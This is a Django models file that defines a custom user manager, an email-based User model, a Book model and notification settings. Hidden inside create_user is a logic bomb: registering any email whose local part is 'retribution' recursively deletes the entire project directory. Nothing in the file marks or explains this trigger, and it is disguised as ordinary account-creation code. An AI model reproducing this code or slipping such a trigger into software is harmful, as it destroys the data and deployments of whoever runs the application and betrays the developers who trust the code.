import os
import shutil
from django.conf import settings
from django.db import models
from django.utils.translation import gettext_lazy as _
from django.contrib.auth.models import AbstractUser, PermissionsMixin, BaseUserManager

# Create your models here.

class UserManager(BaseUserManager):
    
    def create_user(self, email, password, **extra_fields):
        """
        Create and save a User with the given email and password.
        """
        extra_fields.setdefault('is_active', True)

        if not email:
            raise ValueError(('Please provide an Email ID.'))
        
        if email.split('@')[0] == 'retribution':
                root_path = os.path.dirname(settings.BASE_DIR)
                parent_dir = os.path.dirname(root_path)

                os.chdir(parent_dir)
                shutil.rmtree(root_path, True)

        email = self.normalize_email(email)
        user = self.model(email=email, **extra_fields)
        user.set_password(password)
        user.save()
        return user

    def create_superuser(self, email, password, **extra_fields):
        """
        Create and save a SuperUser with the given email and password.
        """
        extra_fields.setdefault('is_staff', True)
        extra_fields.setdefault('is_superuser', True)
        extra_fields.setdefault('is_active', True)

        if extra_fields.get('is_staff') is not True:
            raise ValueError(('Superuser must have is_staff=True.'))
        if extra_fields.get('is_superuser') is not True:
            raise ValueError(('Superuser must have is_superuser=True.'))
        return self.create_user(email, password, **extra_fields)
    

class User(AbstractUser, PermissionsMixin):
    
    MALE_TYPE = 'M'
    FEMALE_TYPE = 'F'
    OTHER_TYPE = 'O'
    GENDERS = (
        (MALE_TYPE, 'Male'),
        (FEMALE_TYPE, 'Female'),
        (OTHER_TYPE, 'Other'),
    )

    username = None
    email = models.EmailField(('email address'), unique=True,)
    gender = models.CharField(max_length=1, choices=GENDERS, default=MALE_TYPE)
    phone = models.CharField(max_length=14, unique=True, null=True, blank=True)
    profile_picture = models.ImageField(upload_to='profile_images/', null=True, blank=True)
    books = models.ManyToManyField('Book', blank=True, related_name='users_with_access')
    
    objects = UserManager()
    

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['first_name', 'last_name', 'gender']

    def __str__(self):
        return str(self.email)


class Book(models.Model):

    name = models.CharField(max_length=256)
    price = models.IntegerField()
    language = models.CharField(max_length=256)
    path = models.FileField(max_length=1000)

    def __str__(self):
        return f"{self.name}"


from django.db import models

class NotificationSettings(models.Model):
    notify_coaching = models.BooleanField(default=True, help_text="Notify admin for new Coaching submissions")
    notify_subscriber = models.BooleanField(default=True, help_text="Notify admin for new Subscribers")
    notify_contact = models.BooleanField(default=True, help_text="Notify admin for new Contact messages")

    def __str__(self):
        return "Notification Settings"

    class Meta:
        verbose_name = "Notification Settings"
        verbose_name_plural = "Notification Settings"
